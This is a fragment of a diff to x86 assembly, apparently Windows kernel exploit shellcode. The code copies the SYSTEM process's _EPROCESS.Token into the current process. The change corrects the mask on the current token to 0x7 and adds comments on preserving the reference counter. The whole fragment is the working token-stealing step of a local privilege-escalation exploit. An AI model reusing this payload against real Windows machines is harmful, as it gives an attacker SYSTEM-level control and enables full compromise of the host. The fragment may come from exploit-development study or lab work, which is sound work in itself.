@@ -18,8 +18,8 @@ search_system_process:
 
 mov edx, [eax + 0xf8] ; copy _EPROCESS.Token of System to edx
 mov edi, [ecx + 0xf8] ; current process token
-and edx, 0xFFFFFFF8
-and edi, 0x3
+and edx, 0xFFFFFFF8 ; apply the mask on SYSTEM process token, to remove the referece counter
+and edi, 0x7 ; apply the mask on the current process token to preserve the referece counter (0y111)
 add edx, edi
 mov [ecx + 0x0f8], edx ; modify the token of the current process
 
